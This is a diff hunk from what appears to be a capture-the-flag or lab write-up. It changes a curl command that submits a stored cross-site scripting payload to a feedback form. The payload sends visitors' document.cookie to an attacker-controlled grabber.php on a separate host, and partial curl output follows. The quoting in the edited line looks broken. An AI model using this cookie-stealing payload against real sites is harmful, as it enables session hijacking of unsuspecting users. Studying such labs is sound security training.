@@ -156,7 +156,7 @@ fclose($fp);
 ## Curl 
 > You can also intercept in Burp Suite, but I'm a cURL fan :)
 ```bash
-$ curl -X POST http://10.10.137.16:8080/submit_feedback --data feedback="<script>document.location='http://10.23.47.147:9001/sticker/grabber.php?c='+document.cookie</script>" -v 
+$ curl -X POST http://10.10.137.16:8080/submit_feedback --data 'feedback="<script>document.location='http://10.23.47.147:9001/sticker/grabber.php?c='+document.cookie</script>' -v 
 Note: Unnecessary use of -X or --request, POST is already inferred.
 *   Trying 10.10.137.16:8080...
 * Connected to 10.10.137.16 (10.10.137.16) port 8080
